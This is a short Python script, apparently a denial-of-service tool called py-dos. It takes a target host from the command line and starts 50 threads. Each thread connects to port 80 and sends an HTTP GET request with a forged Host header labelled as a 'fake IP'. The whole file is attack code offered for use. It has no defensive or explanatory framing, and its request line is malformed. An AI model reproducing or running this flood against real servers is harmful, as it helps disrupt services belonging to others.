#python3
import sys
import socket
import threading

#Define target
if len(sys.argv) == 2:
	target = socket.gethostbyname(sys.argv[1]) #ipv4
else:
	print("Invalid argument.")
	print("Syntax: python3 py-dos.oy <ip>")
	sys.exit()

#var
target = target
fake_ip = '182.21.20.32'
port = 80
#attack_num = 0 for printing but visuals slowing down attack speed!

#banner
print("*"*50)
print("Fake IP: {}".format(fake_ip))
print("*"*50)

def attack():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, port))
	s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
	s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
	s.close()

for i in range(50):
	thread = threading.Thread(target=attack)
	thread.start()